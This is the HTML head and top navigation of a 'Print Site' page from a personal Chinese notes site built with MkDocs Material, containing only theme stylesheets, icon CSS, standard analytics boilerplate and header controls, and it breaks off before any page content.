
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="人生苦短，纵情燃烧">
      
      
        <meta name="author" content="Kailqq">
      
      
        <link rel="canonical" href="https://note.kailqq.cc/print_page/">
      
      
      
      
      <link rel="icon" href="../static/images/logo.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.15">
    
    
      
        <title>Print Site - 71229号港湾</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.342714a4.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      
  
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
  
  <style>:root{--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M156.6%20384.9%20125.7%20354c-8.5-8.5-11.5-20.8-7.7-32.2%203-8.9%207-20.5%2011.8-33.8H24c-8.6%200-16.6-4.6-20.9-12.1s-4.2-16.7.2-24.1l52.5-88.5c13-21.9%2036.5-35.3%2061.9-35.3H200c2.4-4%204.8-7.7%207.2-11.3C289.1-4.1%20411.1-8.1%20483.9%205.3c11.6%202.1%2020.6%2011.2%2022.8%2022.8%2013.4%2072.9%209.3%20194.8-111.4%20276.7-3.5%202.4-7.3%204.8-11.3%207.2v82.3c0%2025.4-13.4%2049-35.3%2061.9l-88.5%2052.5c-7.4%204.4-16.6%204.5-24.1.2S224%20496.7%20224%20488V380.8c-14.1%204.9-26.4%208.9-35.7%2011.9-11.2%203.6-23.4.5-31.8-7.8zM384%20168a40%2040%200%201%200%200-80%2040%2040%200%201%200%200%2080%22/%3E%3C/svg%3E');--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M373.5%2027.1C388.5%209.9%20410.2%200%20433%200c43.6%200%2079%2035.4%2079%2079%200%2022.8-9.9%2044.6-27.1%2059.6L277.7%20319l-10.3-10.3-64-64-10.4-10.4zM170.3%20256.9l10.4%2010.4%2064%2064%2010.4%2010.4-19.2%2083.4c-3.9%2017.1-16.9%2030.7-33.8%2035.4L24.3%20510.3l95.4-95.4c2.6.7%205.4%201.1%208.3%201.1%2017.7%200%2032-14.3%2032-32s-14.3-32-32-32-32%2014.3-32%2032c0%202.9.4%205.6%201.1%208.3L1.7%20487.6%2051.5%20310c4.7-16.9%2018.3-29.9%2035.4-33.8l83.4-19.2z%22/%3E%3C/svg%3E');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M40%2048c-13.3%200-24%2010.7-24%2024v48c0%2013.3%2010.7%2024%2024%2024h48c13.3%200%2024-10.7%2024-24V72c0-13.3-10.7-24-24-24zm152%2016c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h288c17.7%200%2032-14.3%2032-32s-14.3-32-32-32zm0%20160c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h288c17.7%200%2032-14.3%2032-32s-14.3-32-32-32zm0%20160c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h288c17.7%200%2032-14.3%2032-32s-14.3-32-32-32zM16%20232v48c0%2013.3%2010.7%2024%2024%2024h48c13.3%200%2024-10.7%2024-24v-48c0-13.3-10.7-24-24-24H40c-13.3%200-24%2010.7-24%2024m24%20136c-13.3%200-24%2010.7-24%2024v48c0%2013.3%2010.7%2024%2024%2024h48c13.3%200%2024-10.7%2024-24v-48c0-13.3-10.7-24-24-24z%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20384%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M272%20384c9.6-31.9%2029.5-59.1%2049.2-86.2%205.2-7.1%2010.4-14.2%2015.4-21.4%2019.8-28.5%2031.4-63%2031.4-100.3C368%2078.8%20289.2%200%20192%200S16%2078.8%2016%20176c0%2037.3%2011.6%2071.9%2031.4%20100.3%205%207.2%2010.2%2014.3%2015.4%2021.4%2019.8%2027.1%2039.7%2054.4%2049.2%2086.2h160zm-80%20128c44.2%200%2080-35.8%2080-80v-16H112v16c0%2044.2%2035.8%2080%2080%2080m-80-336c0%208.8-7.2%2016-16%2016s-16-7.2-16-16c0-61.9%2050.1-112%20112-112%208.8%200%2016%207.2%2016%2016s-7.2%2016-16%2016c-44.2%200-80%2035.8-80%2080%22/%3E%3C/svg%3E');--md-admonition-icon--success:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M438.6%20105.4c12.5%2012.5%2012.5%2032.8%200%2045.3l-256%20256c-12.5%2012.5-32.8%2012.5-45.3%200l-128-128c-12.5-12.5-12.5-32.8%200-45.3s32.8-12.5%2045.3%200L160%20338.7l233.4-233.3c12.5-12.5%2032.8-12.5%2045.3%200z%22/%3E%3C/svg%3E');--md-admonition-icon--question:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%2032c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v208c0%208.8-7.2%2016-16%2016s-16-7.2-16-16V64c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v272c0%201.5%200%203.1.1%204.6L67.6%20283c-16-15.2-41.3-14.6-56.6%201.4s-14.6%2041.3%201.4%2056.6l112.4%20107c43.1%2041.1%20100.4%2064%20160%2064H304c97.2%200%20176-78.8%20176-176V128c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v112c0%208.8-7.2%2016-16%2016s-16-7.2-16-16V64c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v176c0%208.8-7.2%2016-16%2016s-16-7.2-16-16z%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%2032c14.2%200%2027.3%207.5%2034.5%2019.8l216%20368c7.3%2012.4%207.3%2027.7.2%2040.1S486.3%20480%20472%20480H40c-14.3%200-27.6-7.7-34.7-20.1s-7-27.8.2-40.1l216-368C228.7%2039.5%20241.8%2032%20256%2032m0%20128c-13.3%200-24%2010.7-24%2024v112c0%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24V184c0-13.3-10.7-24-24-24m32%20224a32%2032%200%201%200-64%200%2032%2032%200%201%200%2064%200%22/%3E%3C/svg%3E');--md-admonition-icon--failure:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M12%203c4.97%200%209%203.58%209%208s-6%2010-9%2010-9-5.58-9-10%204.03-8%209-8m-1.69%207.93C9.29%209.29%207.47%208.58%206.25%209.34s-1.38%202.71-.36%204.35c1.03%201.64%202.85%202.35%204.07%201.59%201.22-.78%201.37-2.71.35-4.35m3.38%200c-1.02%201.64-.87%203.57.35%204.35%201.22.76%203.04.05%204.07-1.59%201.02-1.64.86-3.59-.36-4.35s-3.04-.05-4.06%201.59M12%2017.75c-2%200-2.5-.75-2.5-.75%200%20.03.5%202%202.5%202s2.5-2%202.5-2-.5.75-2.5.75%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%2032c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v11.5c0%2049.9-60.3%2074.9-95.6%2039.6l-8.2-8.1C107.7%2062.5%2087.5%2062.5%2075%2075s-12.5%2032.8%200%2045.3l8.2%208.2c35.2%2035.2%2010.2%2095.5-39.7%2095.5H32c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h11.5c49.9%200%2074.9%2060.3%2039.6%2095.6l-8.1%208.2c-12.5%2012.5-12.5%2032.8%200%2045.3s32.8%2012.5%2045.3%200l8.2-8.2c35.3-35.3%2095.6-10.3%2095.6%2039.6V480c0%2017.7%2014.3%2032%2032%2032s32-14.3%2032-32v-11.5c0-49.9%2060.3-74.9%2095.6-39.6l8.2%208.2c12.5%2012.5%2032.8%2012.5%2045.3%200s12.5-32.8%200-45.3l-8.2-8.2c-35.3-35.3-10.3-95.6%2039.6-95.6h11.5c17.7%200%2032-14.3%2032-32s-14.3-32-32-32h-11.5c-49.9%200-74.9-60.3-39.6-95.6l8.2-8.2c12.5-12.5%2012.5-32.8%200-45.3s-32.8-12.5-45.3%200l-8.2%208.2C348.3%20118.4%20288%2093.4%20288%2043.5zM176%20224a48%2048%200%201%201%2096%200%2048%2048%200%201%201-96%200m128%2056a24%2024%200%201%201%200%2048%2024%2024%200%201%201%200-48%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M320%200c17.7%200%2032%2014.3%2032%2032v64h120c39.8%200%2072%2032.2%2072%2072v272c0%2039.8-32.2%2072-72%2072H168c-39.8%200-72-32.2-72-72V168c0-39.8%2032.2-72%2072-72h120V32c0-17.7%2014.3-32%2032-32M208%20384c-8.8%200-16%207.2-16%2016s7.2%2016%2016%2016h32c8.8%200%2016-7.2%2016-16s-7.2-16-16-16zm96%200c-8.8%200-16%207.2-16%2016s7.2%2016%2016%2016h32c8.8%200%2016-7.2%2016-16s-7.2-16-16-16zm96%200c-8.8%200-16%207.2-16%2016s7.2%2016%2016%2016h32c8.8%200%2016-7.2%2016-16s-7.2-16-16-16zM264%20256a40%2040%200%201%200-80%200%2040%2040%200%201%200%2080%200m152%2040a40%2040%200%201%200%200-80%2040%2040%200%201%200%200%2080M48%20224h16v192H48c-26.5%200-48-21.5-48-48v-96c0-26.5%2021.5-48%2048-48m544%200c26.5%200%2048%2021.5%2048%2048v96c0%2026.5-21.5%2048-48%2048h-16V224z%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20576%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M192%2032c0-17.7%2014.3-32%2032-32h128c17.7%200%2032%2014.3%2032%2032v32h48c26.5%200%2048%2021.5%2048%2048v128l44.4%2014.8c23.1%207.7%2029.5%2037.5%2011.5%2053.9l-101%2092.6c-16.2%209.4-34.7%2015.1-50.9%2015.1-19.6%200-40.8-7.7-59.2-20.3-22.1-15.5-51.6-15.5-73.7%200-17.1%2011.8-38%2020.3-59.2%2020.3-16.2%200-34.7-5.7-50.9-15.1L40%20308.7c-18-16.5-11.6-46.2%2011.5-53.9L96%20240V112c0-26.5%2021.5-48%2048-48h48zm-32%20186.7%20107.8-35.9c13.1-4.4%2027.3-4.4%2040.5%200L416%20218.7V128H160zm146.5%20203.2c22.5%2015.5%2050%2026.1%2077.5%2026.1%2026.9%200%2055.4-10.8%2077.4-26.1%2011.9-8.5%2028.1-7.8%2039.2%201.7%2014.4%2011.9%2032.5%2021%2050.6%2025.2%2017.2%204%2027.9%2021.2%2023.9%2038.4s-21.2%2027.9-38.4%2023.9c-24.5-5.7-44.9-16.5-58.2-25-29%2015.6-61.5%2025.9-94.5%2025.9-31.9%200-60.6-9.9-80.4-18.9-5.8-2.7-11.1-5.3-15.6-7.7-4.5%202.4-9.7%205.1-15.6%207.7-19.8%209-48.5%2018.9-80.4%2018.9-33%200-65.5-10.3-94.5-25.8-13.4%208.4-33.7%2019.3-58.2%2025-17.2%204-34.4-6.7-38.4-23.9s6.7-34.4%2023.9-38.4c18.1-4.2%2036.2-13.3%2050.6-25.2%2011.1-9.4%2027.3-10.1%2039.2-1.7%2022.1%2015.2%2050.5%2026%2077.4%2026%2027.5%200%2055-10.6%2077.5-26.1%2011.1-7.9%2025.9-7.9%2037%200%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M579.8%20267.7c56.5-56.5%2056.5-148%200-204.5-50-50-128.8-56.5-186.3-15.4l-1.6%201.1c-14.4%2010.3-17.7%2030.3-7.4%2044.6s30.3%2017.7%2044.6%207.4l1.6-1.1c32.1-22.9%2076-19.3%20103.8%208.6%2031.5%2031.5%2031.5%2082.5%200%20114L422.3%20334.8c-31.5%2031.5-82.5%2031.5-114%200-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4%206.9-34.4-7.4-44.6s-34.4-6.9-44.6%207.4l-1.1%201.6C206.5%20251.2%20213%20330%20263%20380c56.5%2056.5%20148%2056.5%20204.5%200zM60.2%20244.3c-56.5%2056.5-56.5%20148%200%20204.5%2050%2050%20128.8%2056.5%20186.3%2015.4l1.6-1.1c14.4-10.3%2017.7-30.3%207.4-44.6s-30.3-17.7-44.6-7.4l-1.6%201.1c-32.1%2022.9-76%2019.3-103.8-8.6C74%20372%2074%20321%20105.5%20289.5l112.2-112.3c31.5-31.5%2082.5-31.5%20114%200%2027.9%2027.9%2031.5%2071.8%208.6%20103.9l-1.1%201.6c-10.3%2014.4-6.9%2034.4%207.4%2044.6s34.4%206.9%2044.6-7.4l1.1-1.6C433.5%20260.8%20427%20182%20377%20132c-56.5-56.5-148-56.5-204.5%200z%22/%3E%3C/svg%3E');}</style>



  
  
    
    
      
    
    
  
    
    
      
    
    
  
    
    
      
    
    
  
  
  <style>:root{.md-tag.md-tag--default-tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%2080v149.5c0%2017%206.7%2033.3%2018.7%2045.3l176%20176c25%2025%2065.5%2025%2090.5%200l133.5-133.5c25-25%2025-65.5%200-90.5l-176-176c-12-12-28.3-18.7-45.3-18.7L48%2032C21.5%2032%200%2053.5%200%2080m112%2032a32%2032%200%201%201%200%2064%2032%2032%200%201%201%200-64%22/%3E%3C/svg%3E');}.md-tag.md-tag--hardware-tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M176%2024c0-13.3-10.7-24-24-24s-24%2010.7-24%2024v40c-35.3%200-64%2028.7-64%2064H24c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h40v56H24c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h40v56H24c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h40c0%2035.3%2028.7%2064%2064%2064v40c0%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24v-40h56v40c0%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24v-40h56v40c0%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24v-40c35.3%200%2064-28.7%2064-64h40c13.3%200%2024-10.7%2024-24s-10.7-24-24-24h-40v-56h40c13.3%200%2024-10.7%2024-24s-10.7-24-24-24h-40v-56h40c13.3%200%2024-10.7%2024-24s-10.7-24-24-24h-40c0-35.3-28.7-64-64-64V24c0-13.3-10.7-24-24-24s-24%2010.7-24%2024v40h-56V24c0-13.3-10.7-24-24-24s-24%2010.7-24%2024v40h-56zm-16%20104h192c17.7%200%2032%2014.3%2032%2032v192c0%2017.7-14.3%2032-32%2032H160c-17.7%200-32-14.3-32-32V160c0-17.7%2014.3-32%2032-32m192%2032H160v192h192z%22/%3E%3C/svg%3E');}.md-tag.md-tag--software-tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%206.7.2%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202024%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M64%2096c0-35.3%2028.7-64%2064-64h384c35.3%200%2064%2028.7%2064%2064v256h-64V96H128v256H64zM0%20403.2C0%20392.6%208.6%20384%2019.2%20384h601.6c10.6%200%2019.2%208.6%2019.2%2019.2%200%2042.4-34.4%2076.8-76.8%2076.8H76.8C34.4%20480%200%20445.6%200%20403.2M281%20209l-31%2031%2031%2031c9.4%209.4%209.4%2024.6%200%2033.9s-24.6%209.4-33.9%200l-48-48c-9.4-9.4-9.4-24.6%200-33.9l48-48c9.4-9.4%2024.6-9.4%2033.9%200s9.4%2024.6%200%2033.9zm112-34%2048%2048c9.4%209.4%209.4%2024.6%200%2033.9l-48%2048c-9.4%209.4-24.6%209.4-33.9%200s-9.4-24.6%200-33.9l31-31-31-31c-9.4-9.4-9.4-24.6%200-33.9s24.6-9.4%2033.9%200z%22/%3E%3C/svg%3E');}}</style>

    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../css/print-site.css">
    
      <link rel="stylesheet" href="../css/print-site-material.css">
    
      <link rel="stylesheet" href="../css/timeline.css">
    
      <link rel="stylesheet" href="../css/katex.min.css">
    
      <link rel="stylesheet" href="../css/cards.css">
    
      <link rel="stylesheet" href="../css/card.css">
    
      <link rel="stylesheet" href="../css/newfonts.css">
    
      <link rel="stylesheet" href="../css/newadmonitions.css">
    
      <link rel="stylesheet" href="../css/newcolor.css">
    
      <link rel="stylesheet" href="../css/changelogs.css">
    
      <link rel="stylesheet" href="../css/tableandsize.css">
    
      <link rel="stylesheet" href="../css/flink.css">
    
      <link rel="stylesheet" href="../css/float_card.css">
    
      <link rel="stylesheet" href="../css/fdtoc.css">
    
      <link rel="stylesheet" href="../css/tocindex.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css">
    
    <script>__md_scope=new URL("/",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config",""),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
    
  
        <script type="text/javascript">
        document.addEventListener('DOMContentLoaded', function () {
            remove_material_navigation();remove_mkdocs_theme_navigation();generate_toc();
        })
        </script>
        </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="theme" data-md-color-primary="custom" data-md-color-accent="pink">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#index" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href=".." title="71229号港湾" class="md-header__button md-logo" aria-label="71229号港湾" data-md-component="logo">
      
  <img src="../static/images/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            71229号港湾
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Print Site
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="theme" data-md-color-primary="custom" data-md-color-accent="pink"  aria-label="万籁俱寂"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="万籁俱寂" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="custom"  aria-label="萧瑟凌晨"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="萧瑟凌晨" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: no-preference)" data-md-color-scheme="simple" data-md-color-primary="custom" data-md-color-accent="indigo"  aria-label="烈日灼心"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="烈日灼心" for="__palette_0" hidden>
